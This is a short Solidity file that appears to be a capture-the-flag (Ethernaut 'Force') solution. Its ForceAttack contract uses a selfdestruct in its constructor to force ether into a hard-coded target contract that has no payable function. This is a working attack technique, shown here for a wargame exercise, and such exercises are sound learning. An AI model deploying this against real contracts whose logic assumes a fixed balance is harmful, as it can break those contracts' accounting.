pragma solidity ^0.4.18;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract ForceAttack{
    address instanceAddress = 0x56ecda483f123be37303994fcd72905bc48c7e85; //insert your Force contract instance address here
    Force force;
    
    constructor() public payable{ //require payable to be able to create this malicious, or in this case benevolent, contract with funds
        force = Force(instanceAddress); //instantiate a Force contract with the desired instance address
        selfdestruct(instanceAddress); //force send funds into the desired contract
    }
    //remember to deploy the contract with the value you want to be sent to the "victim" contract
}